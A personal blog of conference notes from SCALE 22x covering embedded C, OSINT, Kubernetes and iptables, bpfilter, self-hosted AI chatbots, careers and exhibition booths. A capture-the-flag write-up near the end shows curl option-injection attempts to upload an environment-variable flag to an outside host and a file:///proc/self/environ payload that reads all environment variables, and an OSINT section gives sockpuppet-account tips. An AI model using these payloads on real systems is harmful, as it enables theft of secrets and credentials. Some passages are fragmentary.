<p>Compilation: <code>gcc something</code></p>
<p>Misc Notes</p>
<ul>
<li>Text files are different between all three operating systems because Microsoft, Linux, and Apple decided to store the end of line/newline character as either a carriage return, line feed, or both. This was due to an earlier device which needed to use both a carriage return and a line feed in order to avoid physical issues with ink smudging.</li>
<li>uart library is used for C programming with embedded devices.</li>
<li>Polling is needed since device can be sent to the serial faster than it can be worked with
<ul>
<li>Polling is a simple algorithm: Ask if device is ready, then send character (or do the thing)</li>
<li>Mostly a waste of time, but is very simple</li>
</ul></li>
<li>Interrupt: Alternative, more efficient than polling
<ul>
<li>a signal that “interrupts” the</li>
<li>Device raises interrupt line, CPU halts normal flow and calls interrupt function, which is an actual function</li>
<li>ARM devices save state of machine before interrupt function, which means you don’t have to do it manually</li>
<li>USART2_IRQHandler: interrupt function</li>
</ul></li>
</ul>
<p>I had to leave early, but the author of this talk, Steve Oualline, seems very interesting. He has a <a href="https://nostarch.com/bare-metal-c">book published by no starch press</a>, Bare Metal C, which is about embedded C programming.</p>
<p>He also has some <a href="http://www.oualline.com/books.free/free-books.html">free books</a> and other resources on his website.</p>
<p>Here’s the device I received, the STM32:</p>

<p>This is another presentation, done by [REDACTED], and ███ █████████. Given the topic at hand, and the way that [REDACTED] mentioned trying to scrub her name from the internet, I thought it would be appropriate to redact the presenters’ names. They are easy to find though, consider it an introduction into the world of OSINT.</p>
<p>Both presenters are red team, [REDACTED] is the “people side” and ███ is the “tech side”. [REDACTED] views it as not just a set of steps, but a thought process.</p>
<p>Search Engines:</p>
<ul>
<li>Different search engines give different results (what’s dogpile?)</li>
<li>Different browsers give different results</li>
<li>Different… internet connections?</li>
<li>Search engines can index content that is supposed to be walled and even make it accessible’</li>
<li>Search yourself! Forwards, backwards, etc.</li>
<li>4 or 5 different ways to write phone numbers. International means even more methods. Search every kind in order to get lucky.</li>
<li>Email addresses. What if targets use the same username across email addresses and platforms</li>
<li>Usernames: Divide up, mix around</li>

<li>███: Select names that were popular for a generation and manipulate your accounts to look older/younger</li>
</ul></li>
<li>Sometimes government agency members aren’t permitted to create a sockpuppet account with a real person’s name. A way around this is via other usernames.</li>
<li>Do not use a real person’s image, it’s tracable, especially if the image is from a public source

<li>Iptables tool command line tool can configure nftables or iptables which configure netfilter</li>
<li>Sometimes this causes issues</li>
</ul>
<p>Kubernetes system components must cross the background into kernelspace:</p>
<ul>
<li>CNI’s may need to manage iptables rules</li>
<li>GPUs, CSIs, Meshes</li>
</ul>
<p>Iptables</p>
<ul>
<li>Used by many kubernetes components: kuber-proxy, CNI’s, NPC’s</li>
<li>Pre-container era tool, designed so that there is only one iptables setup on the system</li>
<li>The command line tool can configure the legacy iptables, or nftables</li>
<li>Every component must use either iptables or nftables, otherwise networking will break.
<ul>
<li>K8s community has <a href="https://github.com/kubernetes-sigs/iptables-wrappers">wrappers</a> that detect the mode. Not bulletproof, though, but usually works</li>
</ul></li>
</ul>
<p>Iptables Rules</p>
<ul>
<li>Read ALL rules, do changes, and then write them back</li>
<li>No pratcile way to manage individual rules</li>
</ul>
<p>Iptables versions</p>
<ul>
<li>Rules are stored and executed on kernel level</li>
<li>But the host and containers can have different versions</li>
<li>Different versions can interpret the rules differently</li>
<li>v1.8.7 seems to lack the marking feature, meaning it could bug iptables by a later version into dropping ALL packets rather than just marked ones
<ul>
<li>Presenter had so much <em>fun</em> debugging that one</li>
</ul></li>
</ul>
<p>“I have not seen any attempts at keepign the <em>in kernel</em> ruleset compatible to older versions of iptables-nft” — Phil Sutter (kernel netfilter dev).</p>
<ul>
<li>Basically they don’t treat the above issue as a bug. Lmao.</li>
<li>Presenter defends this, arguing that it makes sense because it’s a pre-container tool, and is not designed to handle multiple instances of it running on your system</li>
</ul>
<p>Iptables must be the same version everywhere:</p>
<ul>
<li>Hosts, kube-proxy, CNI, mesh
<ul>
<li>So this must be why using a firewall with kubernetes is not recommended. It’s unlike a stable release distro will have a firewall that uses the same version of iptables</li>
</ul></li>
<li>Can you really pin all the versions?</li>
<li>k0s began to pin, and vendor iptables into the k0s binary itself.
<ul>
<li>Cannot override host operating system, but they try</li>
</ul></li>
</ul>
<p>Moving away from iptables:</p>
<ul>
<li>Legacy iptables is getting less popular, because of read-all, write all setup
<ul>
<li>Still default in some spots, like kube-proxy</li>
</ul></li>
<li>Nftables and eBPF on the rise
<ul>
<li>Nftables lets you modify a single rule alone</li>
</ul></li>
</ul>
<p>Ipset:</p>
<ul>
<li>Efficient management of sets of addresses</li>
<li>Quick lookups for iptables rules</li>
<li>Stored “in kernel” as hashes, bitmaps, etc</li>
<li><em>Also</em> a pre-containers era tool</li>
</ul>
<p>Ipsets can be managed by multiple components (again):</p>
<ul>
<li>6.2 kernel added a new “bitmask” parameter, which older ipset versions cannot cope with</li>
<li>Now the ipset version matters, but also the kernel version</li>
<li>Version must be pinned across networking pieces: kube-proxy, CNI’s, mesh, NCP, etc
<ul>
<li>k0s can pin all the kubernetes images. But it cannot pin the host.</li>
</ul></li>
<li>Mismatch can cause via OS packages or kernel version updating</li>
</ul>
<p>Modprobe:</p>
<ul>
<li>Userspace tool to load/unload kernel modules</li>
<li>Handles depenencies</li>
<li>Pre containers era tool</li>
</ul>
<p>Kernel modules:</p>
<ul>
<li>Compiled as a “.ko”, kernel object</li>
<li>Distributed as compressed, and modprobe decompresses when unloading
<ul>
<li>Can be compressed via multiple algorithms</li>
<li>The modprobe in a container might not always support the compression algo used on the host. Debian 12 kmod supports ZSTD and XZ, but what if host uses GZ, and the container is Debian 12? Then kernel module loading in the container will fail</li>
</ul></li>
<li>CNIs, CSIs, etc, <em>might</em> need to load modules, so they mount /lib, /sys, etc
<ul>
<li>CNI might need contracts, CSI might need filesystem, GPU stuff, etc</li>
<li>Usually not relevant though</li>
</ul></li>
<li>Audience member: “Are there CNI’s which load modules? Sounds scary?”</li>
</ul>
<p>Debugging:</p>
<ul>
<li>Iptables case caused ALL networking to go down — no ssh access to machine</li>
<li>Very unfamilier errors</li>
<li>Super low level stuff</li>
</ul>
<p>How presenter debugged:</p>
<ul>
<li>They ran k0s in containers, since all their testing was based on this</li>
<li>Read kernel code… a lot of it.</li>
<li>They could docker exec, even if the networking goes down</li>
<li>Trial and error to discover issue</li>
</ul>
<p>Fixes:</p>
<ul>
<li>No easy fix</li>
<li>k0s pins versions of kubernetes components</li>
<li>Test EVERYTHING before rolling out to prod</li>
</ul>

<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/simpler-and-faster-firewall-bpfilter" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/simpler-and-faster-firewall-bpfilter</a></p>
<p><a href="https://naccy.de/2024/10/01/bpfilter-status-report.html" class="uri">https://naccy.de/2024/10/01/bpfilter-status-report.html</a> — blog post by the presenter from last eyar</p>
<p>Linux Firewalls:</p>
<ul>
<li>Iptables: Rules are shaped as C structures
<ul>
<li>See my notes on the problems with iptables from the other talk “Kubernetes and the Dragons in Linux Kernel vs.&nbsp;Userspace Tools”</li>
<li>Not very performant, after 512 rules, performance goes down immensely</li>
</ul></li>
<li>Nftables: Performance drops off after 128 rules, before iptables does</li>
<li>BPF: Much more performant, can also do things like calling a program along with the packet.
<ul>
<li>You must write C code, that works for a specific version of an unstable API</li>
<li>Faster than iptables or nftables</li>
</ul></li>
<li>BPFilter firewall
<ul>
<li>performance drops off at 1024</li>
</ul></li>
</ul>
<p>You can make the firewalls faster using “sets”</p>
<ul>
<li>No performance dropoff after a certain amount of rulesets</li>
<li>Works on nftables and bpfilter</li>
</ul>
<p>Audience member: Have you done a comparison between bpfilter and “nftables offload” where it runs on the NIC itself? But bpfilter seems to also be able to offload.</p>
<p>3 main components:</p>
<ul>
<li>bfcli, libbpfilter, bpfilter</li>
<li>Much more usable cli</li>
</ul>
<p>Chain architecture:</p>
<ul>
<li>Chain is similar to a chain in iptables or a table in nftables</li>
<li>In the chain there are rules, and the rules have an action</li>
<li>Can decide to do normal firewall things, like drop packets</li>
</ul>
<p>Bytecode Factory:</p>
<ul>
<li>Bpfilter creates BPF programs</li>
<li>Similar to event driven programming</li>
<li>Runtime context of the program disappears when it returns, so you have to make “maps to save data”</li>
<li>All the bytecode runs in the kernelspace</li>
<li>BPF verifier will check that BPF code is valid</li>
</ul>
<p>Demo:</p>
<ul>
<li>He runs iptables-legacy and then adjusts some rules</li>
<li>Then uses bpfilter to change some rules and drop some backets</li>
<li>The bpfilters daemon can be “closed”, and then it will stop accepting connections. However, the program is still running.</li>
<li>He shows the bpfilter config setup. It’s… okay. But it’s simialr in complexity (and power), as iptables. For usage by a homelabber or other inexperienced user it would need to be abstracted by another layer like how firewalld and ufw abstract ip/nftables.</li>
<li>Bpfilter also have sets, he shows us a set of ip’s in the config file</li>
</ul>
<p><a href="https://bpfilter.io" class="uri">https://bpfilter.io</a></p>
<p>BPFilter roadmap: <a href="https://github.com/orgs/facebook/projects/50" class="uri">https://github.com/orgs/facebook/projects/50</a></p>
<p>RPM package available in fedora. But the presenter reccommends building it yourself.</p>
<p>Questions (more like answers):</p>
<ul>
<li>I am not satisfied with the answer to my question: What if there are multiple bpclients on the system configuring a single bpfilter daemon
<ul>
<li>But it seems to be better architectured and dodges some of the issues</li>
</ul></li>
<li>It can be used alongside nftables for features that it lacks</li>
</ul>

<h2 class="anchored" data-anchor-id="affording-your-ai-chatbot-friends">Affording your AI chatbot friends</h2>
<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/affording-your-ai-chatbot-friends" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/affording-your-ai-chatbot-friends</a></p>
<p>What if your boss insists that you need AI?</p>
<ul>
<li>But what does AI mean?</li>
<li>What even are you supposed to deploy?</li>
<li>Buy or build? Moving parts? What infra? What is an “AI agent”? Is this expensive?…</li>
</ul>
<p>AI agent:</p>
<ul>
<li>Model that has access to tools, e.g escalating tickets, running sql queries, or</li>
<li>Think square peg, round hole?</li>
</ul>
<p>Moving parts of AI:</p>
<ul>
<li>Models: Big balls of floating point numbers that take input, turn tokens into embeddedings, do CUDA magic, and then spit out more tokens
<ul>
<li>Try llama models to start. Deepseek, or OpenAI</li>
</ul></li>
<li>Inference engine: Thing that runs the models
<ul>
<li>llama.cpp, or the python things</li>
<li>This is the part that needs the GPU to run, the pricy part</li>
</ul></li>
<li>Your code:
<ul>
<li>Sits in the middle, wraps</li>
<li>Most diverse and opinionated</li>
</ul></li>
<li>UI
<ul>
<li>sparkly part</li>
</ul></li>
</ul>
<p>“Excessive acronym compliance” lmao</p>
<p>Model provider methods:</p>
<ul>
<li>Relying on OpenAI means you rely on them to keep your business afloat.
<ul>
<li>Most providers sell at a loss to get adoption</li>
<li>They have replaced snapshots off models with differenent models. Xe had an issue where a new snapshot of chatgpt turned their chatbot fro happy to depressed <code>:(</code>.</li>
<li>Deprecations become emergency.</li>
</ul></li>
<li>Self hosting
<ul>
<li>Big models are truly massive. “Big data is bigger than most people’s laptop ram”.</li>
<li>You own the stack, and can choose models or the deprecation schedule.</li>
<li>A lot more freedom and control</li>
<li>No data is sent to third parties. “This can be very important in acronym compliance”.</li>
</ul></li>
</ul>
<p>Downsides to self hosting:</p>
<ul>
<li>Nvidia drivers… <code>:(</code>. “They will never fall over work hours”.
<ul>
<li>Can be worked around with reduancy, but there are tradeoffs.</li>
</ul></li>
<li>You have to choose the models. Choice paralysis.</li>
<li>Must be opinionated about ollama vs llama.cpp or the other options.
<ul>
<li>Must do research and develop opinions, which costs time.</li>
</ul></li>
<li>You need GPU’s by Nvidia.
<ul>
<li>“I can’t stop you from hurting yourself” — when referring to AMD or apple silicon options</li>
<li>Nvidia GPU’s are the easiest, but extremely pricy, and also have a big wait time.</li>
<li>Service life of one to three years.</li>
</ul></li>
</ul>
<p>Middle path, Nomadic Compute:</p>
<ul>
<li>“Nomadic Compute” — new buzzword by Xe Iaso</li>
<li>Cheating by your setup hunting down the best deal from providers.</li>
<li>All cloud providers have GPU’s. Xe said they saw small clouds on lowendbox advertising GPU setups.</li>
<li>GPU’s you only need model year, video memory, and memory bandwidth. Nothing else matters.</li>
<li>Older cards can be used for AI workflows, but the price per hour goes down.</li>
</ul>
<p>Skypilot:</p>
<ul>
<li>Abstraction layer for infrastructure as a service</li>
<li>Give it a bunch of API keys</li>
<li>It will figure out the best deal and then switch</li>
<li>It will also autoscale up and down</li>
</ul>
<p>Advice:</p>
<ul>
<li>Build on top of boring tools. Don’t waste your “innovation budget”.
<ul>
<li>E.g. Postgres. Object storage. Wireguard in userspace.</li>
</ul></li>
<li>Treat it like a database.</li>
<li>Scale things down when not in use, in order to save money.</li>
<li>Cheat by putting your model weights directly into the docker image.
<ul>
<li>If the image contains the weights, many platforms won’t charge you for the pull time</li>
</ul></li>
<li>Wireguard can be ran in userspace, which is useful for joining machines to eachothers network.</li>
</ul>
<p>Xe started wanting to self host everything, but reality got in the way.</p>
<p>Example Project, Mimi, an AI chatbot that gets images from discord:</p>
<ul>
<li>Used to be entirely self hosted across 3 nodes
<ul>
<li>Homelab server has 12 GB of vram</li>
</ul></li>
<li>Meta releases llama3, which requires 48 GB of vram.</li>
<li>But now runs on a cloud architecture
<ul>
<li>5 dollars (canadia money?) per month for Mimi’s cloud features</li>
</ul></li>
<li>Filter model still runs on self hosted.</li>
</ul>
<p>“It’s okay to use the cloud, just have an exit strategy”</p>
<p><a href="https://opensource.org/ai/open-weights" class="uri">https://opensource.org/ai/open-weights</a></p>
<p><a href="https://fal.ai/" class="uri">https://fal.ai/</a> — Flux image generator as a service, where you pay per image. Much cheaper than running Flux locally, but is not a locked in setup.</p>
<p>Every input matters:</p>
<ul>
<li>Claude gets lazy around august, Chatgpt gets really bad around december. Dates of chat have an effect on the LLM output.</li>
<li>The seed value can be set so that it’s deterministic
<ul>
<li>“seed 3407 is all your need”</li>
</ul></li>
<li>Set the temperature (randomness of output) as low as possible when trying to do something deterministic.</li>
<li>If an app doesn’t need an input, don’t give it to an LLM.</li>
</ul>
<p>Filter models:</p>
<ul>
<li>Sits in the middle of the AI flow, and checks the user input to ensure it is safe.</li>
<li>Also can sanitize</li>
<li>Prevents<br>
</li>
<li>Two most popular are: llamaguard (Xe stated llamaguard3-8b is good despite being small, because it is finetuned) from facebook, and shieldguard from google.</li>
<li>One time Mimi decided that <em>everything</em> was “Election Interference”</li>
</ul>
<p><a href="https://openrouter.ai/" class="uri">https://openrouter.ai/</a></p>
<p>Quantization: lossy compression to make the AI models smaller. The loss is minimal, but neglible.</p>

<h1>Open Source Career Day</h1>
<section id="using-certification-to-prove-home-lab-skills" class="level2">
<h2 class="anchored" data-anchor-id="using-certification-to-prove-home-lab-skills">Using Certification to Prove Home Lab Skills</h2>
<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/using-certification-prove-home-lab-skills" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/using-certification-prove-home-lab-skills</a></p>
<p>Certificate vs Professional Certification:</p>
<ul>
<li>Certificate is just course + test
<ul>
<li>Graduate schools, MOOC’s, product academies</li>
<li>Indicates completion</li>
<li>May be from low stakes quizzes and training</li>
<li>Some of them are fantastic! Like Coursera’s CS50. But many are just trash, since they only require video + quiz.</li>
<li>Sometimes certificates are masked as certifications, even by a companies. Some certificates are just a piece of paper proving that you have a product. Sometimes they try to make <em>you</em> the product.</li>
</ul></li>
<li>Certification
<ul>
<li>Proves a level of competency</li>
<li>High stakes quizzes. Things like final exams of schools, a lengthy, proctored exam.
<ul>
<li>Presenter thinks proctoring is a problem, and is not enjoyable to do.</li>
<li>High stakes is challenging and difficult to do.</li>
</ul></li>
<li>The second assumes you know what you are doing when you show up.</li>
<li>By industry leaders or nonprofits. E.g: Linux foundation. Nonprofits are more credible and vendor neutral.</li>
<li>How to tell it’s actually a certification:
<ul>
<li>Do they publicize their methodology? How did they decide this is what to teach and test?</li>
<li>Because their are many ways to do things, certifications exams will actually make sure they account for every method possible to solve the problem. Simply expecting a specific command can exclude experts who do things a different way.</li>
<li>Industry leaders who make their own technologies will have an understanding of what is needed. Household names, rather than everybody who has a product</li>
</ul></li>
</ul></li>
</ul>
<p>Presenter’s analysis of Certifications:</p>
<ul>
<li>Performance based or Multiple course question (MCQ)? MCQ can be good, but…</li>
<li>How were they made? Subject matter expert involvement? Occupational focus?</li>
<li>High stakes vs low stakes? (Proctoring? Coverage?)</li>
<li>Do they keep up with industry changes?
<ul>
<li>One exam the presenter did hadn’t changed in 15 years…</li>
<li>Good exams require renewals every few years, or continuing education.</li>
<li>But make sure that the content is updated, rather than a subscription to keep the certificate…</li>
</ul></li>
<li>Community and industry reception?
<ul>
<li>Comptia: Historically nonprofit, but recently gone private.</li>
<li>Reddit, etc may be opinonated and like</li>
<li>Sometimes the recruiting department has only heard of one cert, but the hiring manager might have heard of more.</li>
<li>“That was boring” vs “That was kinda fun!”</li>
</ul></li>
<li>Look at prep materials to make sure stuff is good.
<ul>
<li>Harder, more realistic questions are better.</li>
</ul></li>
<li>If it’s a product based focus, then potentially, <em>you</em> are the product
<ul>
<li>“Wanna be a Joe No Name’s Database expert? Occupation? Idk, Data?”</li>
</ul></li>
</ul>
<p>Presenter:</p>
<ul>
<li>Ran a yoga studio… and her own DNS and webserver</li>
<li>Doing this since 1990s</li>
<li>Has a comparative literature degree, so she must prove that she is technically skilled
<ul>
<li>Says that a bachelors is not always needed.</li>
<li>Canonical asks about high school GPA… this is very controversial.</li>
</ul></li>
</ul>
<p>Job searching:</p>
<ul>
<li>You must know what the</li>
<li>“I just see a smattering of skills which may or may not be related”</li>
<li>“Job Skills Validation”, and “Job Task Analysis” (JTA)
<ul>
<li>JTA = Job Task Inventory, and a cert</li>
<li>Different companies mean different things when they mention a role</li>
</ul></li>
<li>If you want “Devops”, don’t apply to every singel job
<ul>
<li>Select a target, a “dream job”, and then cross reference the skillsets</li>
<li>“Criticality”: Importance, Frequency, then questions get asked about various skills</li>
<li>How many jobs want a specific tool, or just “something”. E.g: I just want playbooks, or SDLC, or CI/CD, or etc.</li>
</ul></li>
<li>Advanced level occupations are frequently less technical. Skills like management, communication, leadership, getting things done when no one else is, are unique.</li>
</ul>
<p>Q and A:</p>
<ul>
<li>One commenter suggests looking at Georgia Tech’s masters program, very cheap and Georgia tech is prestigious
<ul>
<li>Up and coming opportunity is revitalizing tech for the federal government…</li>
</ul></li>
<li>How to I pick stuff that lasts the test of time (that are relevant to the industry?):
<ul>
<li>“I reject the question”</li>
<li>You don’t. Software change.</li>
<li>Conceptual understanding and transfer, but presenter says that it was dumb luck</li>
<li>You might be an expert was something that ceased to exist 5 years ago, but on the other end, cobol programmers are still needed.</li>
</ul></li>
<li>How can AI help/ AI certs?
<ul>
<li>Most of the AI certs are product driven</li>
<li>Cloud providers have interesting certs, make sure it’s occupation focused stuff</li>
</ul></li>
<li>Book recommendation, by someone named Martin Yate.
<ul>
<li>Start with the <a href="https://www.amazon.com/Knock-Dead-Ultimate-Search-Guide/dp/150720535X">resume book</a></li>
</ul></li>
<li>One person suggests that we are going about to do</li>
<li>Any specific cert recommendations:
<ul>
<li>Depends on your industry:</li>
<li>With cloud it gets tricky, because you have to “declare industry” to one cloud provider or another.</li>
<li>Target job practice Pick what you want in advancetarget, and then go in that direction.</li>
<li>Skils that I can market and then I can do ajob in.</li>
<li>Devops has some very good online trainings, MOOCS are sometimes varied`</li>
<li>Comptia varies in quality</li>
</ul></li>
</ul>
<p>Presenter suggests that we subscribed to a number of sources that inform her on where the industry is and is going.</p>
<p>After presentation notes:</p>
<ul>
<li>Canonical ubuntu essentials cert, covers ubuntu basics. They don’t have microcloud/microk8s/sunbeam certs yet but plan to in 2027
<ul>
<li>This potentially sets up a career path working with Ubuntu, similar to the way Red Hat has certificates for working with all Red Hat software, in addition to Red Hat Enterprise Linux</li>
</ul></li>
<li>“You only need 1 job” apply to fewer jobs rather than more</li>
<li>security jobs: memorize owasp 10, do the b-side ctf and put on resume.</li>
<li>Comptia A+ is not worth anything, sec+ does have some value though</li>
<li>Focus on the skill. Why does the person you are talking to care?
<ul>
<li>“You’re not telling someone what you can do, you’re selling someone what you can do for them”</li>
</ul></li>
<li>Search jobs and check what’s hot to keep up with the landscape</li>
<li>Job titles to look into: cloud afmin, cloud architecture</li>
<li>Health or fintech are always behind. Startups are always using future software</li>
</ul>

<h1>Scale Next Generation</h1>
<p>They had a great deal of stuff set up for the next generation of Linux users, middle and high schoolers. I thought it was really cool, and since I like teaching, one of the organizers suggested that I hit them up and volunteer</p>
<p>They had multiple machines with the microbits, $20 little pi-like devices that can run python, for teaching python programming.</p>
<p><img src="./blog/scale-22/images/microbitnextgen.jpg" class="img-fluid"></p>
<p>They also had an array of books on Linux and software things:</p>

<h1>Misc Notes from people I meet</h1>
<p>This is going to be a very unorganized section, containing a variety of little snippets from people I meet.</p>
<p>Nix can become nigthmarish to update on Mac OS, due to the system level changes that Mac makes: <a href="https://zenn.dev/kawarimidoll/scraps/3d71b16d1bb7e3" class="uri">https://zenn.dev/kawarimidoll/scraps/3d71b16d1bb7e3</a>.</p>
<p>Best large language model for coding: qwen2.5-32b-instruct. “On par with gpt-02-mini”.</p>
<p>A backend developer would be expected to deploy things and debug containers in kubernetes, or at least understand how their application will run in a k8s environment. Don’t have to be experts. For backend, frontend, not really.</p>
<p><a href="https://mailu.io/2024.06/">mailu</a> helm/docker based email deployment.</p>
<p>To get an ASN, you can simply create a company and then apply for it, but the organization responsible for giving them out has ran out of them.</p>

<h1>Exhibition Hall</h1>
<p>There was some fun stuff in the exhibition hall.</p>
<p>There was a bunch of this new Arm system76 desktop, which they displayed at their booth:</p>
<p><img src="./blog/scale-22/images/system76.jpg" class="img-fluid"></p>
<p>But it was also at the Arm booth:</p>
<p><img src="./blog/scale-22/images/armbooth.jpg" class="img-fluid"></p>
<p>And the Nixos booth (they were using it as a build server/cache on Thursday/Friday in the other conference building and today)</p>
<p><img src="./blog/scale-22/images/nixosampere.jpg" class="img-fluid"></p>
<p>And the Alma Linux booth also had one of these devices:</p>
<p><img src="./blog/scale-22/images/almaampere.jpg" class="img-fluid"></p>
<p>I learned at that booth that apparently, Ovirt is being built and tested against Alma Linux now.</p>
<p>There was other Arm stuff, like this Mac Mini running Arm and Asahi Linux, where they were installing games from steam during the exhibition hall. This was from the Meta/Facebook table.</p>
<p><img src="./blog/scale-22/images/macminiarm.jpg" class="img-fluid"></p>
<p>I learned at the Sofware Freedomm Conservancy booth that they sponsored the event, and all of the routers in the event run the fully free software openwrt operating system.</p>

<p>WRCCDC had a booth as well:</p>
<p><img src="./blog/scale-22/images/wrccdc.jpg" class="img-fluid"></p>
<p>A really interesting booth was the Mentors in Tech (MINT) booth.</p>
<p><img src="./blog/scale-22/images/mentorsintech.jpg" class="img-fluid"></p>
<p>They run a mentorship program for students, designed for getting them into the industry.</p>

<h1>CTF</h1>
<p>The CTF is the Pacific Hackers CTF. I might to a mini writeup here.</p>
<p>First, I try artist, the webdev program. It’s url is at <a href="https://artist.ctf.pacifichackers.com" class="uri">https://artist.ctf.pacifichackers.com</a> I downloaded the source code they provided and saw this in the fake dockerfile:</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode Dockerfile code-with-copy"><code class="sourceCode dockerfile"><span id="cb1-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">ENV</span> FLAG=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"FAKE_FLAG{FOR_TESTING}"</span></span></code></pre></div>
<p>The code doesn’t have the real flag. But based on this, I am guessing that the real flag is an environment variable injected into the docker container from however they are running it.</p>
<p>In the flask code, it runs curl to get the background:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb2-1"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">try</span>:</span>
<span id="cb2-2">    result <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> subprocess.run(</span>
<span id="cb2-3">        [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'curl'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-s'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-L'</span>, background],</span>
<span id="cb2-4">        capture_output<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">True</span>,</span>
<span id="cb2-5">        shell<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">False</span></span>
<span id="cb2-6">    )</span></code></pre></div>
<p>This is ultra sus. Also, I feel like setting the background of a simple drawing app shouldn’t require or interact with the backdend.</p>
<p>We need to make a command that uploads or publishes the environment variable. However, <code>shell=False</code> means we can’t use “&amp;&amp;” or any bash-isms to get more commands.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">[moonpie@osiris ~]$ curl -sL -F</span>
<span id="cb3-2">curl: option -F: requires parameter</span>
<span id="cb3-3">curl: try 'curl --help' for more information</span></code></pre></div>
<p>Interesing. We can do -F, which uploads along with the thing.</p>
<p>So if we do something like this: <code>-F "file=@-" https://0x0.st &lt;&lt;&lt; "$FLAG"</code> and then it should upload our flag to 0x0.st.</p>
<p>Pastebin. Doesn’t seem to work. I threw up my own http server on my server. Maybe something like this? :</p>
<pre><code>curl -d "key1=value1&amp;key2=${ENV_VARIABLE}" http://example.com</code></pre>
<p>This fails since python http server doesn’t accept post. So I have gpt throw together something that does:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb5-1"><span class="im" style="color: #00769E;

<p>And then I run this. <code>curl -X POST -d "Hello, server!" http://localhost:8000</code> to send stuff.</p>
<p>I still can’t exploit the flask logic, however. Also, I don’t know how to do a shell variable replacement from here. I think this is too complex. It seems that the logic returns a base64 encoded version of whatever the output is, so I’ll just attempt to get curl to print the environment variable.</p>
<p><code>curl -w "Username: $TEST\n" http://example.com</code></p>
<p>Whoops, there is an easier way to do this, given to me by a friend:</p>
<p><code>file:///proc/self/environ</code></p>
<p>Just have that as the parameter, and then it outputs a base64 of all of the envirnoment variables.</p>
<p>According to a friend, it’s not possible to inject flags the way that they have used the python subprocess module, since they have each flag as a comma seperated arguement. However, he did claim it is possible in other, less secure setups.</p>
<p>There is also a really interesting set of challenges, the <a href="https://pacifichackers.com/challenges#Level%201">bashcrawl challenges</a>, which are used to teach linux.</p>

<section id="loot" class="level1">
<h1>Loot!</h1>
<p>I got a lot. There are so many exhibitors here giving things out, so I made sure to take advantage.</p>
<p>I will do a detailed sorting and breakdown of what I got later.</p>
<p>So here is the breakdown. Firstly, are the things I bought.</p>
<p><img src="./blog/scale-22/images/loot0.jpg" class="img-fluid"></p>
<p>From the Debian booth, I bought two small SBC’s. And then from the Nixos booth I bought a cool necklace.</p>
<p>Then I went to many of the booths, and got so much cool stuff. From <a href="https://www.rackspace.com/">rackspace</a> I got a nice boogie baord. And then from <a href="https://coder.com/">coder</a> I got a hand skateboard and a fidget cube.</p>
<p>Flox gave everybody 3d printed fidget keycap cases to press. WRCCDC/Coastline college gave people</p>
<p>And then the foldable fidget cube on the left, is from <a href="https://www.purestorage.com/">PureStorage</a></p>
<p><img src="./blog/scale-22/images/loot1.jpg" class="img-fluid"></p>
<p><img src="./blog/scale-22/images/mousepad.jpg" class="img-fluid"></p>
<p>I also managed to get a mousepad from CodeDay/Mentors in Tech.</p>
<p><img src="./blog/scale-22/images/coloringbooks.jpg" class="img-fluid"></p>
<p>And of course, physical versions of the <a href="https://developers.redhat.com/e-books/selinux-coloring-book">SELinux coling book</a> and the <a href="https://developers.redhat.com/e-books/container-commandos-coloring-book">Container Commandos</a> coloring book. I’ve seen the former on the internet before, but not the latter, but it seems to be cool, and goes over Red Hat’s OCI products.</p>
<p><img src="./blog/scale-22/images/loot2.jpg" class="img-fluid"></p>
<p>I got mugs from Arm and Fedora. I think that Mugs weren’t something they were universally giving out, I think you had to be liked by the people working the booths.</p>
<p><img src="./blog/scale-22/images/loot3.jpg" class="img-fluid"></p>
<p>I also got a guitar pick, from the Network Time Foundation. According to them, the guitar pick is custom made, and happens to be the perfect size for shucking hard disks without damaging the disk.</p>

<section id="food-blog" class="level1">
<h1>Food Blog</h1>
<p>People keep telling me I should start one. So here’s a mini food blog.</p>
<p>Day 1:s</p>
<p>So the first day, the first place I went to, for lunch, was <a href="https://www.facebook.com/artlunchusa">Art Lunch</a></p>
<p>I had the Pastrami Sandwich</p>
<p><img src="./blog/scale-22/images/art_lunch.jpg" class="img-fluid"></p>
<p>It was very good, and filling, too. At $14, it was a bit pricy though.</p>
<p>The next place I went to, dinner (Thursday 3/6/25), was an Italian place, Bucca di Bepppo.</p>
<p>This place was a family restaurant, so all the portions were sized for multiple people. I shared Lasagna, Chicken Parmesan, garlic sticks, and Gorgonzola salad with 11 other people.</p>
<p>Overall, it was excellent.</p>
<p>Day 2:</p>
<p>For breakfast, it was again a cream cheese bagel and an apple danish.</p>
<p>For lunch, the Pasadena Convention center provided food as part of the DevopsDay LA open spaces. It was pretty good too, and it was free.</p>
<p><img src="./blog/scale-22/images/turkeysandwich.jpg" class="img-fluid"></p>
<p>I also got some of Tony’s dark chocolate from the Arm booth:</p>
<p><img src="./blog/scale-22/images/darkchocolate.jpg" class="img-fluid"></p>
<p>It was pretty good, 70% dark. It was hard to break pieces off so I could eat or share them though. I only ate half off it, and threw the rest away, it was a really big bar and I couldn’t eat all of it.</p>
<p>For dinner I had an extra one of the sandwiches mentioned above, which a friend had given to me and I saved it so I could eat it later.</p>
